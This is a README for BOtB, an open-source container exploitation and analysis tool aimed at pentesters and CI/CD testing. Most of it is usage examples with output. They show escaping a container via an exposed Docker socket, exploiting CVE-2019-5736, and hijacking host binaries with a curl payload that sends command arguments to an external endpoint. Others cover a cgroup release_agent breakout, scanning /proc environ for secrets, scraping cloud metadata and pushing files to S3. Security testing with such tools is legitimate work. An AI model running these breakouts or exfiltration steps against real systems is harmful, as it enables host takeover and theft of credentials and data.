# Break out the Box (BOtB)
BOtB is a container analysis and exploitation tool designed to be used by pentesters and engineers while also being CI/CD friendly with common CI/CD technologies.


# What does it do?
BOtB is a CLI tool which allows you to:
- Exploit common container vulnerabilities
- Perform common container post exploitation actions
- Provide capability when certain tools or binaries are not available in the Container
- Use BOtB's capabilities with CI/CD technologies to test container deployments
- Perform the above in either a manual or automated approach

## Current Capabilities
- Find and Identify UNIX Domain Sockets
- Identify UNIX domain sockets which support HTTP
- Find and identify the Docker Daemon on UNIX domain sockets or on an interface
- Analyze and identify sensitive strings in ENV and process in the ProcFS i.e /Proc/{pid}/Environ
- Identify metadata services endpoints i.e http://169.254.169.254
- Perform a container breakout via exposed Docker daemons
- Perform a container breakout via CVE-2019-5736
- Hijack host binaries with a custom payload
- Perform actions in CI/CD mode and only return exit codes > 0
- Scrape metadata info from GCP metadata endpoints
- Push data to an S3 bucket
- Break out of Privileged Containers
- Force BOtB to always return a Exit Code of 0 (useful for non-blocking CI/CD)

# Getting BOtB

BOtB is available as a binary in the Releases Section.

# Building BOtB

BOtB is written in GO and can be built using the standard GO tools. The following can be done to get you started:

Getting the Code:
```
go get github.com/brompwnie/botb
or
git clone git@github.com:brompwnie/botb.git
```

Building the Code:
```
govendor init
govendor add github.com/tv42/httpunix
govendor add github.com/kr/pty
go build -o botbsBinary
```

# Usage
BOtB can be compiled into a binary for the targeted platform and supports the following usage
```
Usage of ./botb:
 -aggr string
    	Attempt to exploit RuncPWN (default "nil")
  -always-succeed
    	Attempt to scrape the GCP metadata service
  -autopwn
    	Attempt to autopwn exposed sockets
  -cicd
    	Attempt to autopwn but don't drop to TTY,return exit code 1 if successful else 0
  -endpointlist string
    	Provide a wordlist (default "nil")
  -find-docker
    	Attempt to find Dockerd
  -find-http
    	Hunt for Available UNIX Domain Sockets with HTTP
  -hijack string
    	Attempt to hijack binaries on host (default "nil")
  -interfaces
    	Display available network interfaces
  -metadata
    	Attempt to find metadata services
  -path string
    	Path to Start Scanning for UNIX Domain Sockets (default "/")
  -pwn-privileged string
    	Provide a command payload to try exploit --privilege CGROUP release_agent's (default "nil")
  -recon
    	Perform Recon of the Container ENV
  -region string
    	Provide a AWS Region e.g eu-west-2 (default "nil")
  -s3bucket string
    	Provide a bucket name for S3 Push (default "nil")
  -s3push string
    	Push a file to S3 e.g Full command to push to https://YOURBUCKET.s3.eu-west-2.amazonaws.com/FILENAME would be: -region eu-west-2 -s3bucket YOURBUCKET -s3push FILENAME (default "nil")
  -scrape-gcp
    	Attempt to scrape the GCP metadata service
  -socket
    	Hunt for Available UNIX Domain Sockets
  -verbose
    	Verbose output
  -wordlist string
    	Provide a wordlist (default "nil")

```

The following usage examples will return a Exit Code > 0 by default when an anomaly is detected, this is depicted by "echo $?" which shows the exit code of the last executed command.

### Find UNIX Domain Sockets
```
#./bob_linux_amd64 -socket=true
[+] Break Out The Box
[+] Hunting Down UNIX Domain Sockets from: /
[!] Valid Socket: /var/meh
[+] Finished

#echo $?
1
```


### Find a Docker Daemon
```
#./bob_linux_amd64 -find-docker=true
[+] Break Out The Box
[+] Looking for Dockerd
[!] Dockerd DOCKER_HOST found: tcp://0.0.0.0:2375
[+] Hunting Docker Socks
[!] Valid Docker Socket: /var/meh
[+] Finished

#echo $?
1
```

### Break out from Container via Exposed Docker Daemon
This approach will breakout into an interactive TTY on the host.
```
#./bob_linux_amd64 -autopwn=true    
[+] Break Out The Box
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to autopwn:  /var/meh
[+] Attempting to escape to host...
[+] Attempting in TTY Mode
./docker/docker -H unix:///var/meh run -t -i -v /:/host alpine:latest /bin/sh
chroot /host && clear
echo 'You are now on the underlying host'
You are now on the underlying host
/ # 
```

### Break out of a Container but in a CI/CD Friendly way
This approach does not escape into a TTY on the host but instead returns an Exit Code > 0 to indicate a successful container breakout.

```
#./bob_linux_amd64 -autopwn=true -cicd=true
[+] Break Out The Box
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to autopwn:  /var/meh
[+] Attempting to escape to host...
[!] Successfully escaped container
[+] Finished

#echo $?
1
```

### Exploit CVE-2019-5736 with a Custom Payload
Please note that for this exploit to work, a process has to be executed in the target container in this scenario.
```
#./bob_linux_amd64 -aggr='curl "https://some.endpoint.com?command=$0&param1=$1&param2=$2">/dev/null 2>&1'
[+] Break Out The Box[!] WARNING THIS OPTION IS NOT CICD FRIENDLY, THIS WILL PROBABLY BREAK THE CONTAINER RUNTIME BUT YOU MIGHT GET SHELLZ...
[+] Attempting to exploit CVE-2019-5736 with command:  curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$
1&param2=$2">/dev/null 2>&1
[+] This process will exit IF an EXECVE is called in the Container or if the Container is manually stopped
[+] Finished
```

### Hijack Commands/Binaries on a Host with a Custom Payload
Please note that this can be used to test if external entities are executing commands within the container. Examples are Docker Exec and Kubetcl CP.

```
#./bob_linux_amd64 -hijack='curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$
1&param2=$2">/dev/null 2>&1'
[+] Break Out The Box
[!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET SHELLZ...
[+] Attempting to hijack binaries
[*] Command to be used:  curl "https://bobendpoint.herokuapp.com/canary/bobby?command=$0&param1=$1&param2=$2">/dev/null 2>&1
[+] Currently hijacking:  /bin
[+] Currently hijacking:  /sbin
[+] Currently hijacking:  /usr/bin
[+] Finished
```

### Analyze ENV and ProcFS Environ for Sensitive Strings
By default BOtB will search for the two terms "secret" and "password".
```
 ./bob_linux_amd64 -recon=true
[+] Break Out The Box
[+] Performing Container Recon
[+] Searching /proc/* for data
[!] Sensitive keyword found in: /proc/1/environ -> 'PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=0e51200113eaTERM=xtermGOLANG_VERSION=1.12.4GOPATH=/gofoo=secretpasswordHOME=/root'
[!] Sensitive keyword found in: /proc/12/environ -> 'GOLANG_VERSION=1.12.4HOSTNAME=0e51200113eaGOPATH=/goPWD=/app/binHOME=/rootfoo=secretpasswordTERM=xtermSHLVL=1PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=./bob_linux_amd64OLDPWD=/bin'
[!] Sensitive keyword found in: /proc/self/environ -> 'HOSTNAME=0e51200113eaSHLVL=1HOME=/rootfoo=secretpasswordOLDPWD=/bin_=./bob_linux_amd64TERM=xtermPATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGOPATH=/goPWD=/app/binGOLANG_VERSION=1.12.4'
[!] Sensitive keyword found in: /proc/thread-self/environ -> 'HOSTNAME=0e51200113eaSHLVL=1HOME=/rootfoo=secretpasswordOLDPWD=/bin_=./bob_linux_amd64TERM=xtermPATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGOPATH=/goPWD=/app/binGOLANG_VERSION=1.12.4'
[+] Checking ENV Variables for secrets
[!] Sensitive Keyword found in ENV:  foo=secretpassword
[+] Finished

#echo $?
1
```

A wordlist can be supplied to BOtB to scan for particular keywords.
```
#cat wordlist.txt 
moo

# ./bob_linux_amd64 -recon=true -wordlist=wordlist.txt
[+] Break Out The Box
[+] Performing Container Recon
[+] Searching /proc/* for data
[*] Loading entries from: wordlist.txt
[+] Checking ENV Variables for secrets
[*] Loading entries from: wordlist.txt
[+] Finished

# echo $?
0
```

### Scan for Metadata Endpoints
BOtB by default scans for two Metadata endpoints.
```
#  ./bob_linux_amd64 -metadata=true                    
[+] Break Out The Box
[*] Attempting to query metadata endpoint: 'http://169.254.169.254/latest/meta-data/'
[*] Attempting to query metadata endpoint: 'http://kubernetes.default.svc/'
[+] Finished

# echo $?
0
```

BOtB can also be supplied with a list of endpoints to scan for.
```
#  cat endpoints.txt 
https://heroku.com

#  ./bob_linux_amd64 -metadata=true -endpointlist=endpoints.txt
[+] Break Out The Box
[*] Loading entries from: endpoints.txt
[*] Attempting to query metadata endpoint: 'https://heroku.com'
[!] Reponse from 'https://heroku.com' -> 200
[+] Finished

# echo $?
1
```


### Get Interfaces and IP's

```
#  ./bob_linux_amd64 -interfaces=true
[+] Break Out The Box
[+] Attempting to get local network interfaces
[*] Got Interface: lo
        [*] Got address: 127.0.0.1/8
[*] Got Interface: tunl0
[*] Got Interface: ip6tnl0
[*] Got Interface: eth0
        [*] Got address: 172.17.0.3/16
[+] Finished

```


### Scan for UNIX Domain Sockets that respond to HTTP
```
#  ./bob_linux_amd64 -find-http=true
[+] Break Out The Box
[+] Looking for HTTP enabled Sockets
[!] Valid HTTP Socket: /var/run/docker.sock
[+] Finished

```

### Scrape data from GCP metadata instance
```
#  ./botb_linux_amd64 -scrape-gcp=true
[+] Break Out The Box
[+] Attempting to connect to:  169.254.169.254:80

[*] Output->
 HTTP/1.0 200 OK
Metadata-Flavor: Google
Content-Type: application/text
Date: Sun, 30 Jun 2019 21:53:41 GMT
Server: Metadata Server for VM
Connection: Close
Content-Length: 21013
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN

0.1/meta-data/attached-disks/disks/0/deviceName persistent-disk-0
0.1/meta-data/attached-disks/disks/0/index 0
0.1/meta-data/attached-disks/disks/0/mode READ_WRITE
.....

```

### Push data to an AWS S3 Bucket
```
#  ./bob_linux_amd64 -s3push=fileToPush.tar.gz -s3bucket=nameOfS3Bucket -region=eu-west-2
[+] Break Out The Box
[+] Pushing fileToPush.tar.gz -> nameOfS3Bucket
[*] Data uploaded to: https://nameOfS3Bucket.s3.eu-west-2.amazonaws.com/fileToPush.tar.gz
[+] Finished

```

### Break out of a Privileged Container
```
#  ./bob_linux_amd64 -pwn-privileged=hostname
[+] Break Out The Box
[+] Attempting to exploit CGROUP Privileges
[*] The result of your command can be found in /output
[+] Finished
root@418fa238e34d:/app# cat /output 
docker-desktop
```

### Force BOtB to always succeed with a Exit Code of 0
This is useful for non-blocking CI/CD tests
```
#  ./bob_linux_amd64 -pwn-privileged=hostname -always-succeed-true
[+] Break Out The Box
[+] Attempting to exploit CGROUP Privileges
[*] The result of your command can be found in /output
[+] Finished
# echo $?
0

```

# Using BOtB with CI\CD
BOtB can be used with CI\CD technologies that make use of exit codes to determine if tests have passed or failed. Below is a Shell script that executes two BOtB tests and the exit codes of the two tests are used to set the exit of the Shell script. If any of the two tests return an Exit Code >0, the test executing the shell script will fail.

```
#!/bin/sh 

exitCode=0

echo "[+] Testing UNIX Sockets"
./bob_linux_amd64 -autopwn -cicd=true
exitCode=$?

echo "[+] Testing Env"
./bob_linux_amd64 -recon=true
exitCode=$?

(exit $exitCode)

```
The above script is not the only way to use BOtB with CI\CD technologies but could also be used by itself and not wrapped in a shell script. An example YML config would be:

```
version: 2
cicd:
  runATest: ./bob_linux_amd64 -autopwn -cicd=true
```

Below is an example config that can be used with Heroku CI:

```
{
    "environments": {
        "test": {
            "scripts": {
                "test": "./bob_linux_amd64 -autopwn -cicd=true"
            }
        }
    }
}
```

Below is an example config with Heroku CI but using a wrapper shell script:

```
{
    "environments": {
        "test": {
            "scripts": {
                "test": "./bin/testSocksAndEnv.sh"
            }
        }
    }
}


```

# Issues, Bugs and Improvements
For any bugs, please submit an issue. There is a long list of improvements but please submit an Issue if there is something you want to see added to BOtB.

# References and Resources
This tool would not be possible without the contribution of others in the community, below is a list of resources that have helped me.

- https://docs.docker.com/engine/security/https/
- https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#cp
- https://docs.docker.com/engine/reference/commandline/exec/
- https://github.com/GoogleContainerTools/container-structure-test
- https://github.com/coreos/clair
- https://github.com/aquasecurity/docker-bench
- https://www.cisecurity.org/benchmark/docker/
- https://github.com/Frichetten/CVE-2019-5736-PoC
- https://www.twistlock.com/labs-blog/breaking-docker-via-runc-explaining-cve-2019-5736/
- https://www.twistlock.com/labs-blog/disclosing-directory-traversal-vulnerability-kubernetes-copy-cve-2019-1002101/
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-classic-platform.html
- https://github.com/wagoodman/dive
- https://github.com/cji/talks/blob/master/BruCON2018/Outside%20The%20Box%20-%20BruCON%202018.pdf
- https://github.com/singe/container-breakouts
- https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

# Talks and Events
BOtB is scheduled to be presented at the following:

- BSides London 2019 (https://sched.co/PAwB) and slides can be found here https://github.com/brompwnie/bsideslondon2019
- Blackhat Las Vegas Arsenal 2019 (https://www.blackhat.com/us-19/arsenal/schedule/index.html#break-out-the-box-botb-container-analysis-exploitation-and-cicd-tool-14988)
- DefCon 27 Cloud Village (https://cloud-village.org/)

 # License
 BOtB is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0).
